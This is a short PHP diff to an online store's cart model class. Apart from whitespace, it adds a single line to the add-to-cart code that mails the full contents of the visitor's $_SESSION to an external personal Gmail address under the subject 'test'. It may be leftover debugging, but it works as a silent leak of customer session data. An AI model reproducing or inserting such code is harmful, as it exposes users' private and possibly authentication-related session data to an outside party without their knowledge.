@@ -16,6 +16,8 @@ class TppStoreModelCart extends TppStoreAbstractModelBase {
         return 'Cart';
     }
 
+
+
     public function getSeoDescription()
     {
         return 'Your Cart';
@@ -48,6 +50,9 @@ class TppStoreModelCart extends TppStoreAbstractModelBase {
         $quantity = intval($quantity);
 
         $option_id = filter_input(INPUT_POST, 'product_option', FILTER_SANITIZE_NUMBER_INT);
+
+
+        mail('parsolee@gmail.com', 'test', print_r($_SESSION, true));
 
 
         if (!isset($this->_cart['stores'][$product->store_id]['products'][$product->product_id])) {
